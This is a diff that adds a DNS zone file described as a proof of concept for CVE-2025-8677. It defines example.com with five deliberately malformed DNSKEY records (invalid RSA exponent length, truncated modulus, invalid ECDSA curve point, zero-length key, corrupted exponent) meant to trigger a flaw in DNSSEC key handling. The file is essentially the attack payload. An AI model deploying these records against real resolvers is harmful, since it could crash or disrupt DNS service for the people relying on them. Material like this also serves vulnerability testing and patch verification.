@@ -1,0 +1,31 @@
+; CVE-2025-8677 POC - Malformed DNSKEY Zone File
+; This zone contains DNSKEY records that trigger the vulnerability
+
+$ORIGIN example.com.
+$TTL 3600
+
+@       IN      SOA     ns1.example.com. admin.example.com. (
+                        2025112701  ; Serial
+                        3600        ; Refresh
+                        1800        ; Retry
+                        604800      ; Expire
+                        86400 )     ; Minimum TTL
+
+@       IN      NS      ns1.example.com.
+ns1     IN      A       127.0.0.1
+
+; Malformed DNSKEY #1: Invalid RSA exponent length
+example.com.	3600	IN	DNSKEY	256 3 8 AQADCAMBAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
+
+; Malformed DNSKEY #2: Truncated RSA modulus
+example.com.	3600	IN	DNSKEY	257 3 5 AQEDBQMBAAH/////////////////////////////////////////////////////////////////////////////////////
+
+; Malformed DNSKEY #3: Invalid ECDSA curve point
+example.com.	3600	IN	DNSKEY	256 3 13 AQADDQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
+
+; Malformed DNSKEY #4: Zero-length public key
+example.com.	3600	IN	DNSKEY	256 3 8 AQADCA==
+
+; Malformed DNSKEY #5: Corrupted RSA exponent
+example.com.	3600	IN	DNSKEY	257 3 8 AQEDCP8AAAAAAAAAAAAA/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////w==
+
